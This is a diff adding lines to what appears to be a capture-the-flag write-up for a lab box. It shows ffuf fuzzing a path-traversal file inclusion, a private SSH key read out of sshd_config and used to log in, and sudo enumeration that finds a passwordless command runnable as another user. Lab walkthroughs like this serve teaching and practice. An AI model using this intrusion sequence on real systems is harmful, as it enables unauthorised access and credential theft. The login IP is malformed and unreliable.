@@ -263,10 +263,22 @@ I wanted to automate querying of the files so I used ffuf to do that.
 ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -t 80 -u http://dev.team.thm/script.php?page=../../../../../../../../..FUZZ -fs 1
 Returns a number of files and after looking at a few of them I checked the "/etc/ssh/sshd_config" which at the bottom contained the dale user id_rsa file.
 I copied it to a file and removed all the "#"s before the key. I used "chmod 600 id_rsa_dale" to modify the permissions of the file so I wouldn't the an error about unprotected private key file.
+Now I should be able to log in using "ssh -i id_rsa_dale dale@10.10.10.28.97".
+-----
+dale@TEAM:~$ id
+uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1003(editors)
+-----
 
+One of the first things I do when getting into a box is to check if I can run anything with sudo.
+-----
+dale@TEAM:~$ sudo -l
+Matching Defaults entries for dale on TEAM:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-
-
+User dale may run the following commands on TEAM:
+    (gyles) NOPASSWD: /home/gyles/admin_checks
+-----
+So I'm able to run the "admin_checks" file as a "gyles" user. 
 
 
 
